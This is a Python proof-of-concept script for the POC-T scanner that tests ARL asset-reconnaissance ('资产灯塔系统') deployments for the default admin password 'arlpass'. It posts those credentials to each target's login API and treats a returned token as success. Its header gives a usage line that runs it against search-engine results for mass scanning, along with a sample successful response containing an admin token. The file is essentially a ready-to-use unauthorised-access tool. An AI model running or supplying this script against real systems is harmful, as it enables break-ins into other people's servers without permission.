#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   ARL-weak-pass.py
@DateTime :  2023/7/17 18:11


    python POC-T.py -s ARL-weak-pass.py -aF 'product="资产灯塔系统"'



# ok
{
    "message": "success",
    "code": 200,
    "data": {
        "username": "admin",
        "token": "8b95f3b670f26c1940b403653296c5ed",
        "type": "login"
    }
}

'''

import requests


def extract_info():
    pass


def poc(url):
    url = "https://" + url if "//" not in url else url
    url = url.rstrip('/') + "/api/user/login"
    headers = {'Content-Type': 'application/json'}
    data = {"username": "admin", "password": "arlpass"}
    try:
        response = requests.post(url, headers=headers, json=data, timeout=5, verify=False)
        rtext = str(response.text)
        is_logged_in = "token" in rtext and "admin" in rtext
        return is_logged_in

    except Exception as e:
        # print("Exception: %s" % str(e))
        return False